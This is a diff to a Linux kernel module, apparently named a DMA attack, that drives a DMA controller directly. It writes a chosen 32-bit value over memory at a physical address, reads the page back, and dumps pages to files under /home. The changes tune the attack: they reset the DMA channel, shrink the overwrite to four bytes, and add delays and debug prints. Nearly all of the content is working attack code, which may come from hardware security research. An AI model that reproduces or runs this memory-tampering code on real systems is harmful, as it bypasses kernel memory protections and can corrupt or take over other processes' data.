@@ -147,7 +147,8 @@ void dma_tx(volatile struct DmaChannelHeader* dmaHeader, void* physSrcPage, void
 	volatile struct DmaControlBlock* cb1;
 
 	memset((void*)dmaHeader, 0, sizeof(struct DmaChannelHeader));
-	mdelay(500);
+	dmaHeader->CS = DMA_CS_RESET;	//make sure to disable dma first.
+	mdelay(2000);
 
 	virtCbPage = (void*)__get_dma_pages(GFP_ATOMIC, 0);
 	memset(virtCbPage, 0, 4096);
@@ -191,7 +192,7 @@ void dma_tx(volatile struct DmaChannelHeader* dmaHeader, void* physSrcPage, void
 
 
 	printk("DMA STATUS REGISTER (AFTER Tx) %x\n", dmaHeader->CS);
-printk("TI STATUS AFTER: %x\n", cb1->TI);
+	printk("TI STATUS AFTER: %x\n", cb1->TI);
 
 	free_pages((unsigned long)virtCbPage, 0);	
 
@@ -269,28 +270,17 @@ static int __init dma_attack_init(void)
 
 
 	printk("Overriding data with %x\n", data);
-	// memset(virtDstPage, 0, 4096);
 
-	// virtCopyPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
-	
-	// if (virtCopyPage == NULL) {
-	// 	pr_err("Failed allocated virtDstPage\n");
-	// 	return -1;
-	// }
-
-	// memset(virtCopyPage, 0, 4096);
-
-	// physCopyPage = virt_to_phys(virtCopyPage);
-
-	// *((uint32_t*)virtCopyPage) = data;
-	// // Copy the data to the addr
-	*((uint32_t*)virtDstPage) = data;
+	// // Copy the data to the address
+	((uint32_t*)virtDstPage)[0] = data;
 	mdelay(2000);
 	F1 = file_open("/home/PageToWrite.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
 	file_write(F1, 0, (char*)virtDstPage, 4096);
 	file_sync(F1); 
 	file_close(F1);
-	dma_tx(dmaHeader, physDstPage, physSrcPage, 4096);
+
+	// Override the data transaction
+	dma_tx(dmaHeader, physDstPage, physSrcPage, 4);
 	mdelay(2000);
 	// Check if the data really changed
 	memset(virtDstPage, 0, 4096);
@@ -308,12 +298,13 @@ static int __init dma_attack_init(void)
 	}
 
 	memset(virtNewDstPage, 0, 4096);
-
+	mdelay(500);
 	physNewDstPage = virt_to_phys(virtNewDstPage);
-
+	printk("Read from addr: %x\n", physSrcPage);
+	mdelay(1000);
 	dma_tx(dmaHeader, physSrcPage, physNewDstPage, 4096);
 	// printk("Read from %x the data: %x\n", physDstPage, (uint32_t*)virtDstPage[0]);
-	mdelay(5000);
+	mdelay(6000);
 	F2 = file_open("/home/OverridenPage.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
 	file_write(F2, 0, (char*)virtNewDstPage, 4096);
 	file_sync(F2); 
@@ -321,7 +312,6 @@ static int __init dma_attack_init(void)
 
 	free_pages((unsigned long)virtDstPage, 0);
 	free_pages((unsigned long)virtNewDstPage, 0);
-	free_pages((unsigned long)virtCopyPage, 0);
 
 
 	// free_pages((unsigned long)virtSrcPage, 0);
